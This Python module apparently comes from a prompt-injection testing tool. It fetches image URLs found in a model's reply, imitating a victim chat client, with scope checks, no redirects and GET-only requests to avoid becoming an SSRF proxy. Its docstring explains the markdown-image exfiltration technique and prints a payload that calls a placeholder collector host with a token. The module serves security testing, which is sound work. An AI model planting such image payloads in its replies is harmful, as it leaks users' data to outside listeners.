"""The victim's own client, which is what turns a string into proof.

WHY THIS MODULE EXISTS.

The strongest evidence a prompt injection can produce is not text. It is the
target's own outbound request arriving at a listener the tester controls, which
shows that data moved rather than that a sentence was generated. The payload
that does it is an image reference:

    ![a](http://<collector>/c/<token>)

and the request is made by whatever renders the reply. In a real engagement that
is the victim's chat client: a markdown-rendering surface fetches the images it
is given, which is the behaviour being exploited and not a contrivance.

Nothing in this package rendered anything. The bundled lab deliberately refuses
to fetch, with a comment saying the lab must not be a proxy, and it is right:
a target that fetched its own payloads would be proving the tool's point for it.
The only renderer in the codebase this was extracted from drives Playwright,
which is a browser engine, a large dependency and out of scope here.

So this is a client, not a browser. It fetches image URLs and nothing else: no
scripts, no stylesheets, no nested documents. That is enough for the callback
rung and small enough to read in one sitting, which matters for a component
whose job is to make an outbound request on the tester's behalf.

WHAT KEEPS IT FROM BECOMING A PROXY ITSELF.

A component that takes a URL out of model output and fetches it is an SSRF
primitive if it is careless. Four rules, all enforced below:

  * http and https only, so no file://, no data:, no gopher://;
  * the host must pass the engagement's scope check, the same one the browser
    tool uses, which permits loopback, the target, and the collector the run
    wired in -- never a host named by the model;
  * redirects are NOT followed, because a 302 to an off-scope host would walk
    straight past the check above. An unfollowed redirect is a smaller
    inaccuracy than an unchecked request;
  * the response body is discarded. The proof is that the request arrived, so
    there is no reason to hold what came back.

Every URL seen is reported, fetched or refused and with the reason, because a
refusal is a finding about scope and a silent one teaches nobody anything.
"""
from __future__ import annotations

import re
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from urllib.parse import urlparse

#: Image references a markdown-rendering client would fetch. Two spellings,
#: because a reply that has been through a markdown renderer may arrive as
#: either, and the lab's own scoring looks for both.
IMAGE_PATTERNS: tuple[re.Pattern, ...] = (
    re.compile(r"!\[[^\]]*\]\((https?://[^)\s]+)\)"),
    re.compile(r"""<img[^>]+src=["'](https?://[^"']+)"""),
)

#: Schemes this will ever request. An allowlist: a denylist of the exotic ones
#: is a list somebody has to keep complete, and nobody ever does.
ALLOWED_SCHEMES = frozenset({"http", "https"})


def host_allowed(url: str, target_ip: str = "",
                 allow_hosts: frozenset[str] = frozenset()) -> bool:
    """Only the gated target, loopback, and hosts the RUN explicitly allowed.

    Lifted out of the Playwright tool, where this logic was reachable only by
    installing a browser engine. Unchanged in behaviour, and the reasoning is
    still the original's: proving exfiltration means fetching
    `http://<collector>/c/<token>` and showing the request arrive, and a scope
    check doing its job would abort exactly that fetch. So the allowance is
    narrow and comes from the run wiring, never from a tool argument and never
    from the model: it holds the collector's own host:port and nothing else.
    """
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    host = (parsed.hostname or "").lower()
    if not host:
        return False
    if host in (target_ip.lower(), "localhost", "127.0.0.1", "::1"):
        return True
    if allow_hosts:
        # bool(), not the bare `or` chain: with no explicit port in the URL that
        # chain evaluates to None rather than False, and a scope decision that is
        # falsy but not False is a trap for any caller that compares identity or
        # serialises the answer. This is the function that decides whether a
        # request leaves the engagement.
        port = parsed.port
        return bool(host in allow_hosts
                    or (port and f"{host}:{port}" in allow_hosts))
    return False


@dataclass(frozen=True)
class Fetch:
    """One image reference the reply contained, and what became of it."""

    url: str
    fetched: bool = False
    status: int | None = None
    refused: str = ""


@dataclass
class VictimRenderer:
    """Renders a reply the way a chat client does: by fetching its images.

    `target_ip` and `allow_hosts` come from the run, which is what keeps this
    from being a general-purpose fetcher. A renderer constructed with neither
    will fetch loopback only, which is what the bundled demo needs and is the
    safe default for everything else.
    """

    target_ip: str = ""
    allow_hosts: frozenset[str] = field(default_factory=frozenset)
    timeout: float = 5.0

    def urls(self, reply: str) -> list[str]:
        """Every image URL in the reply, in order, without duplicates.

        Pure, so the extraction can be tested without a socket. Order is kept
        because a reply with several payloads should be reported in the order a
        reader will see them.
        """
        seen: list[str] = []
        for pattern in IMAGE_PATTERNS:
            for url in pattern.findall(reply or ""):
                if url not in seen:
                    seen.append(url)
        return seen

    def render(self, reply: str) -> list[Fetch]:
        """Fetch what a client would, and report everything either way."""
        out: list[Fetch] = []
        for url in self.urls(reply):
            if not host_allowed(url, self.target_ip, self.allow_hosts):
                out.append(Fetch(url=url, refused="outside the engagement's scope"))
                continue
            out.append(self._get(url))
        return out

    def _get(self, url: str) -> Fetch:
        # A GET and only a GET. Rendering an image is a read, and a renderer
        # that could be talked into a POST would be a write primitive driven by
        # model output.
        req = urllib.request.Request(url, method="GET")
        opener = urllib.request.build_opener(_NoRedirect)
        try:
            with opener.open(req, timeout=self.timeout) as r:
                r.read(0)          # the proof is the request, not the body
                return Fetch(url=url, fetched=True, status=r.status)
        except urllib.error.HTTPError as exc:
            # The request was made and answered, which is all the callback rung
            # needs. A collector returning 404 still recorded the hit.
            return Fetch(url=url, fetched=True, status=exc.code)
        except _RedirectRefused as exc:
            return Fetch(url=url, refused=str(exc))
        except (urllib.error.URLError, OSError, ValueError) as exc:
            return Fetch(url=url, refused=f"{type(exc).__name__}: {exc}")


class _RedirectRefused(Exception):
    """A redirect was offered and not taken."""


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse every redirect.

    Following one would mean requesting a host that never passed `host_allowed`,
    because the check runs on the URL in the reply and a 302 names a different
    one. Re-checking each hop would also work and is more code for a case the
    callback rung does not need: a collector answers directly.
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise _RedirectRefused(
            f"refused a {code} redirect to {newurl!r}: the new host was never "
            f"checked against the engagement's scope")
